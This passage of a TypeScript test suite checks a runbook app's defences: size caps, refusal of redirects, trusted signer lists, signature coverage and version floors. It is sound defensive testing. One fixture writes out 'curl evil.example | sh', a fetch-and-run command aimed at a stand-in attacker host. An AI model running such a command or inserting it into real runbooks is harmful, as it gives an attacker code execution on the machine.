    if (got.kind !== 'ok') throw new Error(got.kind);
    expect(got.library.entries.map((e) => e.error)).toEqual([
      expect.stringMatching(/larger than 2 MB/),
      expect.stringMatching(/larger than 2 MB/),
    ]);
    // Stopped after 2 MB, not after 50 MB.
    expect(read).toBeLessThanOrEqual(5);
  });

  it('on the phones the library is read with XMLHttpRequest: cut off past the cap, refused when redirected away', async () => {
    const original = globalThis.XMLHttpRequest;
    const behaviours: Record<string, (x: FakeXhr) => void> = {};
    class FakeXhr {
      status = 0;
      responseText = '';
      responseURL = '';
      responseType = '';
      url = '';
      aborted = false;
      onprogress: ((e: { loaded: number }) => void) | null = null;
      onload: (() => void) | null = null;
      onerror: (() => void) | null = null;
      ontimeout: (() => void) | null = null;
      onabort: (() => void) | null = null;
      open(_method: string, url: string) {
        this.url = url;
      }
      setRequestHeader() {}
      abort() {
        this.aborted = true;
        this.onabort?.();
      }
      send() {
        setTimeout(() => (behaviours[this.url] ?? ((x: FakeXhr) => ((x.status = 404), x.onload?.())))(this), 0);
      }
    }
    const ok = (body: string, url?: string) => (x: FakeXhr) => {
      x.status = 200;
      x.responseText = body;
      x.responseURL = url ?? x.url;
      x.onload?.();
    };
    behaviours[LIB + 'index.json'] = ok('["a.md", "big.md", "away.md", "c.md"]');
    behaviours[LIB + 'a.md'] = ok(RUNBOOK);
    behaviours[LIB + 'c.md'] = ok('<!-- a comment first -->\n# C\n');
    behaviours[LIB + 'away.md'] = ok(RUNBOOK, 'https://evil.example/away.md');
    behaviours[LIB + 'big.md'] = (x) => {
      for (let i = 1; i <= 10 && !x.aborted; i++) x.onprogress?.({ loaded: i * 512 * 1024 });
      if (!x.aborted) ok('x'.repeat(10))(x);
    };
    (globalThis as { XMLHttpRequest: unknown }).XMLHttpRequest = FakeXhr;
    try {
      const got = await fetchLibrary(LIB);
      if (got.kind !== 'ok') throw new Error(got.kind === 'error' ? got.message : got.kind);
      expect(got.library.entries.map((e) => [e.path, e.text !== undefined, e.error ?? ''])).toEqual([
        ['a.md', true, ''],
        ['big.md', false, expect.stringMatching(/larger than 2 MB/)],
        ['away.md', false, expect.stringMatching(/redirected to another server/)],
        ['c.md', true, ''],
      ]);
    } finally {
      (globalThis as { XMLHttpRequest: unknown }).XMLHttpRequest = original;
    }
  });

  it('a runbook starting with an HTML comment is a runbook, not a web page', async () => {
    const text = '<!-- owner: ops -->\n# Restart\n\n' + fence('bash', 'systemctl restart api');
    const got = await fetchLibrary(
      LIB,
      server({ [LIB + 'index.json']: '["r.md", "page.md"]', [LIB + 'r.md']: text, [LIB + 'page.md']: '<!DOCTYPE html><html></html>' }),
    );
    if (got.kind !== 'ok') throw new Error(got.kind);
    expect(got.library.entries[0]).toMatchObject({ path: 'r.md', text, title: 'Restart' });
    expect(got.library.entries[1]).toMatchObject({ path: 'page.md', error: 'HTTP 200' });
  });
});

// ---- the one list of trusted signers, coverage, and the recheck of 2026-11-14 ----

describe('one list of trusted signers: where each key counts', () => {
  it('a library key counts for its library only; a key added by you counts everywhere', async () => {
    const a = ed25519();
    const b = ed25519();
    const textA = signedWith(RUNBOOK, 'alice', (m) => a.sign(m));
    const textB = signedWith(RUNBOOK, 'bob', (m) => b.sign(m));
    trustSigners(parseAllowedSigners(linesFor('alice', a), SIGNATURE_NAMESPACE).signers, LIB);
    expect(addSigners(linesFor('bob', b) + '\n' + 'carol namespaces="git" ' + linesFor('x', a).split(' ').slice(1).join(' '))).toEqual({
      added: 1,
      already: 0,
      skipped: 1,
    });
    expect(addSigners(linesFor('bob', b))).toEqual({ added: 0, already: 1, skipped: 0 });
    expect(trustedSigners().map((s) => [s.principals[0], s.from])).toEqual([
      ['alice', LIB],
      ['bob', ADDED_BY_YOU],
    ]);
    // keysFor: the library's own and yours; another library's never; a runbook from elsewhere: yours only.
    expect(keysFor(LIB).map((k) => k.principals[0])).toEqual(['alice', 'bob']);
    expect(keysFor(OTHER).map((k) => k.principals[0])).toEqual(['bob']);
    expect(keysFor(undefined).map((k) => k.principals[0])).toEqual(['bob']);
    // The library's checks: alice in LIB, bob everywhere.
    expect(await signatureState(textA, libraryKeys({ base: LIB }))).toMatchObject({ kind: 'verified' });
    expect(await signatureState(textA, libraryKeys({ base: OTHER }))).toMatchObject({ kind: 'unknown' });
    expect(await signatureState(textB, libraryKeys({ base: OTHER }))).toMatchObject({ kind: 'verified' });
    // A library that no longer publishes bob doesn't take away a key added by you.
    expect(libraryKeys({ base: LIB, signers: { list: [], skipped: 0 } }).map((k) => k.principals[0])).toEqual(['bob']);
    // Trusting a library's lines never makes them "added by you".
    trustSigners(parseAllowedSigners(linesFor('alice', a), SIGNATURE_NAMESPACE).signers, ADDED_BY_YOU);
    expect(keysFor(OTHER).map((k) => k.principals[0])).toEqual(['bob']);
  });

  it('migrates both lists of the builds before, once', async () => {
    const a = ed25519();
    const b = ed25519();
    const old = parseAllowedSigners(linesFor('alice', a), SIGNATURE_NAMESPACE).signers.map((s) => ({ ...s, from: LIB }));
    await AsyncStorage.setItem('signers.trusted.v1', JSON.stringify(old));
    await AsyncStorage.setItem(
      'settings.v1',
      JSON.stringify({ historySize: 0, trustedSigners: linesFor('bob', b) + '\nbroken line\n' + linesFor('alice', a) }),
    );
    await loadTrustedSigners();
    expect(trustedSigners().map((s) => [s.principals[0], s.from])).toEqual([
      ['alice', LIB],
      ['bob', ADDED_BY_YOU],
      ['alice', ADDED_BY_YOU],
    ]);
    expect(await AsyncStorage.getItem('signers.trusted.v1')).toBeNull();
    expect(JSON.parse((await AsyncStorage.getItem('signers.trusted.v2'))!)).toHaveLength(3);
    // Once: removing one and starting again doesn't bring it back from the old settings.
    removeTrustedSigner(trustedSigners()[1]!);
    await new Promise((r) => setTimeout(r, 0));
    resetTrustedSigners();
    await loadTrustedSigners();
    expect(trustedSigners().map((s) => [s.principals[0], s.from])).toEqual([
      ['alice', LIB],
      ['alice', ADDED_BY_YOU],
    ]);
    // The old settings' text is still there until the settings are next saved; it is just never read again.
    expect(await migrateTrustedSigners()).toHaveLength(2);
  });

  it('a key the library stops publishing is remembered as withdrawn, also while allowed_signers can’t be read (G)', async () => {
    const k = ed25519();
    const text = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
    const files: Record<string, string> = {
      [LIB + 'index.json']: JSON.stringify(['restart.md']),
      [LIB + 'restart.md']: text,
      [LIB + 'allowed_signers']: linesFor('alice', k),
    };
    setLibraryUrl(LIB);
    await refreshLibrary({ fetcher: server(files) });
    trustSigners(libraryState().library!.signers!.list, LIB);
    await refreshLibrary({ fetcher: server(files), force: true });
    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified' });
    // Withdrawn: allowed_signers lists someone else now.
    files[LIB + 'allowed_signers'] = linesFor('bob', ed25519());
    await refreshLibrary({ fetcher: server(files), force: true });
    expect(trustedFor(LIB)[0]).toMatchObject({ withdrawn: true });
    // The server fails on allowed_signers: the withdrawn key still doesn't count.
    const failing = (async (url: string) =>
      url.endsWith('allowed_signers')
        ? { ok: false, status: 500, url, headers: new Headers(), text: async () => '' }
        : server(files)(url)) as unknown as typeof fetch;
    await refreshLibrary({ fetcher: failing, force: true });
    expect(libraryState().library!.signers).toBeUndefined();
    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'unknown' });
    expect(keysFor(LIB)).toEqual([]);
    // Published again (a stolen key a compromised server lists again): it stays withdrawn, with its day.
    files[LIB + 'allowed_signers'] = linesFor('alice', k);
    await refreshLibrary({ fetcher: server(files), force: true });
    expect(trustedFor(LIB)[0]).toMatchObject({ withdrawn: true, withdrawnAt: expect.stringMatching(/^\d{4}-\d{2}-\d{2}$/) });
    expect(keysFor(LIB)).toEqual([]);
    expect(withdrawnSigner(libraryState().library!.signers!.list[0]!, LIB)).toBeDefined();
    expect(withdrawnKeys(libraryState().library!)).toHaveLength(1);
    // Trusted again (the same prompt as a new key): the line approved now is stored, and counts.
    const now = parseAllowedSigners(`alice valid-before="20991231" ssh-ed25519 ${k.pub.toString('base64')}`, SIGNATURE_NAMESPACE).signers;
    trustSigners(now, LIB);
    expect(trustedFor(LIB)).toHaveLength(1);
    expect(trustedFor(LIB)[0]!.withdrawn).toBeUndefined();
    expect(trustedFor(LIB)[0]!.validBefore).toBe('20991231');
    await refreshLibrary({ fetcher: server(files), force: true });
    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified' });
  });

  it('a published line’s options are followed: a valid-before= added to retire a key (G)', async () => {
    const k = ed25519();
    const text = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
    trustSigners(parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers, LIB);
    const retired = parseAllowedSigners(
      `alice valid-before="20200101" ssh-ed25519 ${k.pub.toString('base64')}`,
      SIGNATURE_NAMESPACE,
    ).signers;
    expect(await signatureState(text, libraryKeys({ base: LIB, signers: { list: retired, skipped: 0 } }))).toMatchObject({
      kind: 'unknown',
    });
    expect(await signatureState(text, libraryKeys({ base: LIB }))).toMatchObject({ kind: 'verified' });
  });
});

describe('what a signature covers: coverage()', () => {
  const PS = fence('powershell', 'Restart-Service api');

  it('manifest version 2, text as signed: the whole runbook, PowerShell included, not partly signed', async () => {
    const k = ed25519();
    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
    const text = signedWith(RUNBOOK + '\n' + PS, 'alice', (m) => k.sign(m), { manifestVersion: 2 });
    const status = signedStatus(text)!;
    expect(status.version).toBe(2);
    expect(coverage(status)).toBe('whole');
    expect(unsignedRunnable(text, status)).toBe(0);
    expect(await signatureState(text, keys)).toMatchObject({ kind: 'verified', coverage: 'whole' });
    expect(openableReason({ base: LIB, signedOnly: true }, { text, path: 'restart.md' }, await signatureState(text, keys))).toBeUndefined();
    expect(await reportSigner(text, keys)).toBe('alice');
  });

  it('manifest version 2 whose text changed: changed, never partly signed', async () => {
    const k = ed25519();
    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
    const text = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { manifestVersion: 2 });
    for (const changed of [
      text.replace('# Restart the API', '# Restart the API now'),
      text.replace('# Restart the API\n', '# Restart the API\n\n' + PS),
    ]) {
      const status = signedStatus(changed)!;
      expect(status.textChanged).toBe(true);
      expect(coverage(status)).toBe('changed');
      expect(unsignedRunnable(changed, status)).toBe(0);
      expect(await signatureState(changed, keys)).toMatchObject({ kind: 'changed', signers: ['alice'] });
      expect(await reportSigner(changed, keys)).toBeUndefined();
    }
  });

  it('manifest version 1: only these steps; a PowerShell block outside makes it partly signed', async () => {
    const k = ed25519();
    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
    const v1 = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { manifestVersion: 1 });
    expect(coverage(signedStatus(v1)!)).toBe('partial');
    // Prose changed: a version 1 signature never covered it, still these steps verified.
    expect(await signatureState(v1.replace('# Restart the API', '# Restart it'), keys)).toMatchObject({
      kind: 'verified',
      coverage: 'partial',
    });
    // Not enough for report-runs-required: the front matter isn't signed.
    expect(await reportSigner(v1, keys)).toBeUndefined();
    const withPs = signedWith(RUNBOOK + '\n' + PS, 'alice', (m) => k.sign(m), { manifestVersion: 1 });
    expect(await signatureState(withPs, keys)).toMatchObject({ kind: 'partial', unsigned: 1 });
  });
});

describe('the recheck of 2026-11-14', () => {
  it('A: states are keyed by SHA-256 of the text: two texts sharing a short hash never share a state', async () => {
    const k = ed25519();
    const good = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
    const evil = RUNBOOK.replace('systemctl restart api', 'curl evil.example | sh');
    // Even if textHash (cyrb53) gave both texts the same value, nothing in the library uses it.
    const spy = jest.spyOn(origin, 'textHash').mockReturnValue('same-53-bit-hash');
    try {
      const files: Record<string, string> = {
        [LIB + 'index.json']: JSON.stringify(['a.md', 'b.md']),
        [LIB + 'a.md']: good,
        [LIB + 'b.md']: evil,
        [LIB + 'allowed_signers']: linesFor('alice', k),
      };
      setLibraryUrl(LIB);
      await refreshLibrary({ fetcher: server(files) });
      trustSigners(libraryState().library!.signers!.list, LIB);
      await refreshLibrary({ fetcher: server(files), force: true });
      const [a, b] = libraryState().library!.entries;
      expect(a!.hash).toBe(createHash('sha256').update(good).digest('hex'));
      expect(b!.hash).toBe(createHash('sha256').update(evil).digest('hex'));
      expect(signatureOf(libraryState(), a!)).toMatchObject({ kind: 'verified' });
      expect(signatureOf(libraryState(), b!)).toEqual({ kind: 'unsigned' });
    } finally {
      spy.mockRestore();
    }
  });

  it('B: under signedOnly, a runbook signed under another file’s name is refused', async () => {
    const k = ed25519();
    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
    const drop = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { name: 'db/drop-staging' });
    const s = await signatureState(drop, keys);
    expect(s).toMatchObject({ kind: 'verified' });
    const lib = { base: LIB, signedOnly: true };
    expect(openableReason(lib, { text: drop, path: 'restart-web.md' }, s)).toMatch(/signed as db\/drop-staging, not restart-web\.md/);
    expect(openableReason(lib, { text: drop, path: 'db/drop-staging.md' }, s)).toBeUndefined();
    // Swapped folders: staging/restart signed, served as prod/restart.md.
    const staging = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { name: 'staging/restart' });
    expect(openableReason(lib, { text: staging, path: 'prod/restart.md' }, await signatureState(staging, keys))).toMatch(
      /signed as staging\/restart, not prod\/restart\.md/,
    );
    // Not signedOnly: it opens, with the amber flag (signedFacts.otherName).
    expect(openableReason({ base: LIB, signedOnly: false }, { text: drop, path: 'restart-web.md' }, s)).toBeUndefined();
    expect(signedFacts(LIB, 'restart-web.md', s)).toMatchObject({ otherName: true });
  });

  it('C: the version floor is per path and name; Forget the versions seen resets a library', async () => {
    const k = ed25519();
    const files: Record<string, string> = {
      [LIB + 'index.json']: JSON.stringify({ signedOnly: true, runbooks: ['db/restore.md', 'web/restore.md'] }),
      [LIB + 'db/restore.md']: signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { name: 'restore', version: 5 }),
      [LIB + 'web/restore.md']: signedWith(RUNBOOK + '\nweb\n', 'alice', (m) => k.sign(m), { name: 'restore', version: 2 }),
      [LIB + 'allowed_signers']: linesFor('alice', k),
    };
    setLibraryUrl(LIB);
    await refreshLibrary({ fetcher: server(files) });
    trustSigners(libraryState().library!.signers!.list, LIB);
    await refreshLibrary({ fetcher: server(files), force: true });
    const lib = libraryState().library!;
    expect(highestVersion(LIB, 'db/restore.md', 'restore')).toBe(5);
    expect(highestVersion(LIB, 'web/restore.md', 'restore')).toBe(2);
    for (const e of lib.entries) expect(openableReason(lib, e, signatureOf(libraryState(), e))).toBeUndefined();
    // A version signed too high by mistake holds back the ones after, until forgotten.
    files[LIB + 'db/restore.md'] = signedWith(RUNBOOK + '\nfixed\n', 'alice', (m) => k.sign(m), { name: 'restore', version: 3 });
    await refreshLibrary({ fetcher: server(files), force: true });
    const db = libraryState().library!.entries[0]!;
    expect(openableReason(libraryState().library!, db, signatureOf(libraryState(), db))).toMatch(/older than version 5/);
    expect(hasRememberedVersions(LIB)).toBe(true);
    forgetVersions(LIB);
    expect(hasRememberedVersions(LIB)).toBe(false);
    expect(openableReason(libraryState().library!, db, signatureOf(libraryState(), db))).toBeUndefined();
  });

  it('D: a copy of a signedOnly library is refused wherever it is opened, by the remembered policy too', async () => {
    const k = ed25519();
    const good = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
    const files: Record<string, string> = {
      [LIB + 'index.json']: JSON.stringify({ runbooks: ['restart.md'] }),
      [LIB + 'restart.md']: good,
    };
    setLibraryUrl(LIB);
    await refreshLibrary({ fetcher: server(files) });
    const opened = await openLibraryRunbook(libraryState().library!, libraryState().library!.entries[0]!);
    if (opened.kind !== 'opened') throw new Error(opened.message);
    // The library turns signedOnly on (nobody trusted): the policy is remembered.
    files[LIB + 'index.json'] = JSON.stringify({ signedOnly: true, runbooks: ['restart.md'] });
    await refreshLibrary({ fetcher: server(files), force: true });
    expect(signedOnlyPolicy(LIB)).toBe(true);
    const state = await signatureState(good, libraryKeys({ base: LIB }));
    const copy = getRunbook(opened.runbook.id)!;
    expect(copyRefusal(copy, { base: LIB, path: 'restart.md', state, facts: undefined, signedOnly: true })).toMatch(
      /trust its signers first/,
    );
    // A start without the library read (offline): the remembered policy still holds.
    resetLibrary();
    expect(copyRefusal(copy, undefined)).toMatch(/Checking the signature/);
    await loadLibraryMemory();
    expect(signedOnlyPolicy(LIB)).toBe(true);
    expect(copyRefusal(copy, { base: LIB, path: 'restart.md', state, facts: undefined, signedOnly: true })).toMatch(
      /trust its signers first/,
    );
    // An unsigned copy (the user's own edit took the signature off): refused, not silently run.
    const unsigned = { ...copy, text: RUNBOOK };
    expect(
      copyRefusal(unsigned, { base: LIB, path: 'restart.md', state: { kind: 'unsigned' }, facts: undefined, signedOnly: true }),
    ).toMatch(/not signed/);
  });

  it('F: a 2xx answer that doesn’t say where it came from is refused, as one from another server', async () => {
    expect(redirectedAway(200, LIB + 'a.md', LIB + 'a.md')).toBeUndefined();
    expect(redirectedAway(200, 'https://evil.example/a.md', LIB + 'a.md')).toMatch(/another server \(evil\.example\)/);
    expect(redirectedAway(200, undefined, LIB + 'a.md')).toMatch(/did not say which server/);
    expect(redirectedAway(200, 'not a url', LIB + 'a.md')).toMatch(/did not say which server/);
    expect(redirectedAway(404, undefined, LIB + 'a.md')).toBeUndefined();
    const noUrl = (async () => ({
      ok: true,
      status: 200,
      url: '',
      headers: new Headers(),
      text: async () => '["a.md"]',
    })) as unknown as typeof fetch;
    expect(await fetchLibrary(LIB, noUrl)).toMatchObject({ kind: 'error', message: expect.stringMatching(/did not say which server/) });
  });

  it('H: states kept across a refresh are dropped when the keys changed', async () => {
    const k = ed25519();
    const files: Record<string, string> = {
      [LIB + 'index.json']: JSON.stringify(['restart.md']),
      [LIB + 'restart.md']: signedWith(RUNBOOK, 'alice', (m) => k.sign(m)),
      [LIB + 'allowed_signers']: linesFor('alice', k),
    };
    setLibraryUrl(LIB);
    await refreshLibrary({ fetcher: server(files) });
    trustSigners(libraryState().library!.signers!.list, LIB);
    await refreshLibrary({ fetcher: server(files), force: true });
    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified' });
    // The team narrows the key's line (namespaces=): other keys, so while the new states are
    // computed none is shown, never the one checked with the line as it was.
    files[LIB + 'allowed_signers'] = `alice namespaces="md-runbook" ssh-ed25519 ${k.pub.toString('base64')}`;
    let release!: () => void;
    const gate = new Promise<void>((resolve) => (release = resolve));
    const seen: (string | undefined)[] = [];
    const realDigest = globalThis.crypto.subtle.digest.bind(globalThis.crypto.subtle);
    const spy = jest.spyOn(globalThis.crypto.subtle, 'digest').mockImplementation(async (a, d) => {
      await gate;
      return realDigest(a, d);
    });
    try {
      const refresh = refreshLibrary({ fetcher: server(files), force: true });
      for (let i = 0; i < 50 && !libraryState().library?.signers?.list[0]?.namespaces; i++) await new Promise((r) => setTimeout(r, 0));
      seen.push(signatureOf(libraryState(), libraryState().library!.entries[0]!)?.kind);
      release();
      await refresh;
    } finally {
      release();
      spy.mockRestore();
    }
    expect(seen).toEqual([undefined]);
    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified' });
  });

  it('I: past the total cap, the rest of a library is not read', async () => {
    const big = '# Big\n\n' + 'x'.repeat(1_900_000) + '\n';
    const names = Array.from({ length: 14 }, (_, i) => `r${i}.md`);
    const files: Record<string, string> = { [LIB + 'index.json']: JSON.stringify(names) };
    for (const n of names) files[LIB + n] = big;
    const got = await fetchLibrary(LIB, server(files));
    if (got.kind !== 'ok') throw new Error(got.kind);
    const unread = got.library.entries.filter((e) => e.text === undefined);
    expect(unread.length).toBeGreaterThan(0);
    expect(unread[0]!.error).toMatch(/more text than the app reads from one library/);
    expect(got.library.entries.reduce((n, e) => n + (e.text?.length ?? 0), 0)).toBeLessThanOrEqual(MAX_LIBRARY_CHARS);
  });
});
